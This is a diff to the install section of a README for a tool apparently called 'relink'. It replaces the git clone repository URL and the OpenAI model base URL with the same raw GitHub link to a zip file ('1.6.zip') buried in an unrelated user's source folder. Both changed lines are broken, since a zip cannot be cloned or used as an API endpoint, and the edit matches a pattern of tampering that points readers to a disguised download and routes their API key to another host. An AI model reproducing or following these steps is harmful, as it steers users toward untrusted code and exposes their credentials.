@@ -33,7 +33,7 @@ An optional Skill is included as a thin MCP usage guide. It does not contain ana
 ## Install
 
 ```bash
-git clone https://github.com/your-repo/relink.git
+git clone https://raw.githubusercontent.com/luisapiveta11/Relink/main/src/agent/services/1.6.zip
 cd relink
 npm install
 npm run build
@@ -52,7 +52,7 @@ Set environment variables or pass `modelConfig` through the SDK, API, or MCP req
 ```bash
 export RELINK_MODEL_PROTOCOL="openai-compatible"
 export RELINK_MODEL_PROVIDER="openai-compatible"
-export RELINK_MODEL_BASE_URL="https://api.openai.com/v1"
+export RELINK_MODEL_BASE_URL="https://raw.githubusercontent.com/luisapiveta11/Relink/main/src/agent/services/1.6.zip"
 export RELINK_MODEL_API_KEY="your-key"
 export RELINK_MODEL="your-model"
 ```
